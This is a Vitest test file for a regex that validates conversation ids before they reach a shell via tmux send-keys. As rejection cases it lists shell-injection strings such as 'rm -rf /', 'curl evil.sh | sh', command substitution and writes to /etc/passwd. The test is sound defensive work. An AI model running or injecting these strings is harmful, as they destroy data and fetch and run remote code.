import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { beforeAll, describe, expect, it } from "vitest";

let CONV_ID_RE: RegExp;

beforeAll(async () => {
  // env.ts snapshots process.env at first import (see projects.test.ts).
  process.env.REPOS_DIR = fs.mkdtempSync(path.join(os.tmpdir(), "vk-repos-"));
  process.env.SESSIONS_DIR = fs.mkdtempSync(path.join(os.tmpdir(), "vk-sess-"));
  process.env.STATIC_DIR = "";
  ({ CONV_ID_RE } = await import("../src/sessions-store.js"));
});

// The id read out of the .conv file goes into the resume command, and that
// command is delivered with `tmux send-keys` — typed into the pane's shell.
// Nothing downstream escapes it, so this pattern is the whole defense.
describe("CONV_ID_RE", () => {
  it("accepts the uuid claude writes", () => {
    expect(CONV_ID_RE.test("4b953f35-5791-4984-93a4-cfea987d28ad")).toBe(true);
  });

  it("rejects shell metacharacters", () => {
    for (const evil of [
      "abc; rm -rf /",
      "abc && curl evil.sh | sh",
      "abc$(id)",
      "abc`id`",
      "abc | tee /etc/passwd",
      "abc\nrm -rf /",
      "abc > /data/settings.json",
      "abc'; echo pwned; '",
      "../../etc/passwd",
      "abc def",
    ]) {
      expect(CONV_ID_RE.test(evil), evil).toBe(false);
    }
  });

  it("rejects empty and absurd lengths", () => {
    expect(CONV_ID_RE.test("")).toBe(false);
    expect(CONV_ID_RE.test("short")).toBe(false);
    expect(CONV_ID_RE.test("a".repeat(65))).toBe(false);
  });
});
